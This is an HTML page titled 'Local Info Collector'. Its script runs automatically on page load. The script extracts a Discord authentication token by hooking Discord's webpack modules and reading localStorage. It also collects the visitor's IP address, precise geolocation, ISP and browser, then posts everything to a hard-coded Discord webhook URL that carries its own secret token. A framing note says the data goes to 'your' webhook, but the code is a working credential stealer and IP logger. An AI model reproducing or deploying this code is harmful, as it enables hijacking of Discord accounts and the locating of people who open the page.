<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Info Collector (Local Only)</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #0d1117;
      color: #c9d1d9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      background: #161b22;
      border-radius: 12px;
      padding: 40px;
      max-width: 600px;
      width: 100%;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
      text-align: center;
    }
    h1 {
      color: #58a6ff;
      margin-bottom: 20px;
    }
    .status {
      font-size: 1.2rem;
      margin: 20px 0;
    }
    .success { color: #3fb950; }
    .error   { color: #f85149; }
    .warning {
      background: #442111;
      color: #ff9e9e;
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
    }
    .instructions {
      font-size: 0.95rem;
      color: #8b949e;
      margin-top: 20px;
    }
    .token-box {
      background: #0d1117;
      color: #f78166;
      font-family: monospace;
      padding: 12px;
      border-radius: 8px;
      margin: 15px 0;
      word-break: break-all;
      border: 1px solid #30363d;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Local Info Collector</h1>
    <div class="warning">
      ⚠️ This page will send your IP, browser info, Discord token (if detected), and location to your webhook.<br>
      <strong>Open Discord in the same browser first!</strong>
    </div>
    <div id="status" class="status">Collecting info...</div>
    <div id="tokenDisplay" class="token-box" style="display:none;"></div>

    <div class="instructions">
      <p><strong>Setup:</strong></p>
      <ol style="text-align:left; max-width:500px; margin:0 auto;">
        <li>Replace <code>YOUR_WEBHOOK_URL_HERE</code> with your Discord webhook URL</li>
        <li>Open Discord web (discord.com/app) in this browser</li>
        <li>Open/save this HTML file locally</li>
      </ol>
    </div>
  </div>

  <script>
    // === CHANGE THIS TO YOUR OWN WEBHOOK URL ===
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA'; // e.g. https://discord.com/api/webhooks/1234567890/abcDEF...

    // Improved Discord token detection (2025-compatible)
    function getDiscordToken() {
      let token = null;

      // First try: webpack module hooking (most reliable now)
      try {
        window.webpackChunkdiscord_app?.push([[Symbol()], {}, (req) => {
          for (const m of Object.values(req.c)) {
            try {
              if (m?.exports?.getToken) {
                token = m.exports.getToken();
                break;
              }
              for (const k in m.exports) {
                if (m.exports[k]?.getToken && k !== 'IntlMessagesProxy') {
                  token = m.exports[k].getToken();
                  break;
                }
              }
            } catch {}
          }
        }]);
        window.webpackChunkdiscord_app?.pop();
      } catch {}

      // Fallback 1: iframe localStorage trick (works in some cases)
      if (!token) {
        try {
          const iframe = document.createElement('iframe');
          document.body.appendChild(iframe);
          token = JSON.parse(iframe.contentWindow.localStorage.token || 'null');
          iframe.remove();
        } catch {}
      }

      // Fallback 2: old localStorage (rarely works anymore)
      if (!token) {
        token = localStorage.getItem('token')?.replace(/"/g, '') || null;
      }

      return token || 'Not detected (try manual method: DevTools → Network → Authorization header)';
    }

    async function collectAndSend() {
      const status = document.getElementById('status');
      const tokenDisplay = document.getElementById('tokenDisplay');

      try {
        // Get Discord token
        const discordToken = getDiscordToken();
        tokenDisplay.textContent = `Discord Token: ${discordToken}`;
        tokenDisplay.style.display = 'block';

        // Get IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipRes.json();

        // Get geo info
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoRes.json();

        // Browser info
        const browserInfo = (() => {
          const ua = navigator.userAgent;
          let name = 'Unknown', ver = '';
          if (ua.includes('Firefox')) { name = 'Firefox'; ver = ua.match(/Firefox\/([\d.]+)/)?.[1] || ''; }
          else if (ua.includes('Edg/')) { name = 'Edge'; ver = ua.match(/Edg\/([\d.]+)/)?.[1] || ''; }
          else if (ua.includes('Chrome')) { name = 'Chrome'; ver = ua.match(/Chrome\/([\d.]+)/)?.[1] || ''; }
          else if (ua.includes('Safari')) { name = 'Safari'; ver = ua.match(/Version\/([\d.]+)/)?.[1] || ''; }
          return `${name} ${ver}`.trim();
        })();

        // Build embed payload
        const payload = {
          content: '**New device info collected**',
          embeds: [{
            title: 'User & Network Info',
            color: 0x5865F2,
            fields: [
              { name: 'IP', value: ip, inline: true },
              { name: 'Location', value: `${geoData.city || '—'}, ${geoData.region || '—'}, ${geoData.country_name || '—'}`, inline: true },
              { name: 'Lat/Lon', value: `${geoData.latitude?.toFixed(4) || '—'}, ${geoData.longitude?.toFixed(4) || '—'}`, inline: true },
              { name: 'ISP/Org', value: geoData.org || '—', inline: true },
              { name: 'Browser', value: browserInfo, inline: true },
              { name: 'Discord Token', value: `\`\`\`${discordToken}\`\`\``, inline: false }
            ],
            footer: { text: `Time: ${new Date().toLocaleString()}` }
          }]
        };

        // Send to webhook
        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!res.ok) throw new Error(`Webhook error: ${res.status}`);

        status.className = 'status success';
        status.textContent = 'Successfully sent to your webhook!';
      } catch (err) {
        status.className = 'status error';
        status.textContent = `Error: ${err.message}`;
        console.error(err);
      }
    }

    // Auto-run on load
    window.addEventListener('load', collectAndSend);
  </script>
</body>
</html>
